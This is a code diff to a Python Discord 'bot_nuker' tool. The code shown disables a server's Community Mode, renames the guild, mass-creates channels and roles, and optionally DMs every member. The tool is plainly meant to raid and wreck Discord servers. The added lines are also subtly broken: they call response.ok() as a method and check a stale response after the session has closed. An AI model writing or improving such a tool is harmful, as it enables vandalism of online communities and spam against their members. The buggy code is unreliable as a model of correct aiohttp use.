@@ -169,11 +169,18 @@ def bot_nuker():
 
             async with aiohttp.ClientSession() as session:
                 async with session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", json=data, headers=headers) as response:
-                    if response.status == 200:
+                    if response.ok:
                         await asynccprint("Disabled Community Mode", 0)
                     else:
                         response_text = await response.text()
                         await asynccprint(f"Failed to update guild settings. Status code: {response.status}, Response: {response_text}", 1)
+
+            await guild.edit(name=guild_name)
+            if response.ok():
+                await asynccprint(f"Changed server name to \"{guild_name}\"", 0)
+            else:
+                response_text = await response.text()
+                await asynccprint(f"Failed to change server name. Status code: {response.status}, Response: {response_text}", 1)
 
             guild = bot.get_guild(guild_id)
 
@@ -194,9 +201,6 @@ def bot_nuker():
             create_roles = [asyncio.create_task(create_role(guild)) for _ in range(role_spam_times)]
 
             await asyncio.gather(*create_channels, *create_roles)
-
-            await guild.edit(name=guild_name)
-            await asynccprint(f"Changed server name to \"{guild_name}\"", 0)
 
             if dm_members.strip().lower() == 'y':
                 members = [member.id for member in guild.members]
